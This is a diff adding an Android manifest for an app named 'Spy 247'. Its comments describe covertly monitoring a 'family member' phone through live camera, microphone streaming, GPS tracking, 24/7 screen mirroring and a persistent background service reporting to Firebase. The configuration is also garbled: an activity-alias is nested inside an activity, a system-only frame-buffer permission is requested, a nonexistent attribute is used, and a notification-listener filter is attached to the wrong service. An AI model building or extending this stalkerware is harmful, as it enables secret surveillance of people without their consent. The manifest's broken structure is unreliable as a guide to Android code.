@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.spy247.app">
+
+    <!-- Core Permissions for 24/7 Spy -->
+    
+    <!-- Camera Access (for live camera feed) -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    
+    <!-- Microphone (for voice recording & live mic stream) -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    
+    <!-- Location Tracking (GPS for real-time location) -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    
+    <!-- Screen Mirroring (for 24/7 screen view) -->
+    <uses-permission android:name="android.permission.READ_FRAME_BUFFER" />
+    
+    <!-- Background Service (to keep running even when app is in background) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    
+    <!-- Internet & WiFi for Firebase connection -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    
+    <!-- Wake Lock (to prevent screen from dimming during live view) -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Spy 247"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.Spy247">
+
+        <!-- Main Activity - Entry point for both modes -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="false"
+            android:screenOrientation="portrait">
+            
+            <!-- Controller Mode (Your Hub Phone) -->
+            <meta-data
+                android:name="device_mode"
+                android:value="controller" />
+            
+            <!-- Family Member Mode (The Spy Device) -->
+            <activity-alias
+                android:name=".MainActivity.FamilyMemberAlias"
+                android:exported="true"
+                android:launchOrder="first"
+                android:theme="@style/Theme.Spy247.FullScreen">
+                
+                <!-- Launch as Family Member by default if no intent -->
+                <intent-filter>
+                    <action android:name="android.intent.action.MAIN" />
+                    <category android:name="android.intent.category.LAUNCHER" />
+                </intent-filter>
+            </activity-alias>
+
+        </activity>
+
+        <!-- Foreground Service for continuous background operation -->
+        <service
+            android:name=".ForegroundService"
+            android:enabled="true"
+            android:exported="false">
+            
+            <!-- Notification channel for foreground service -->
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+    </application>
+</manifest>
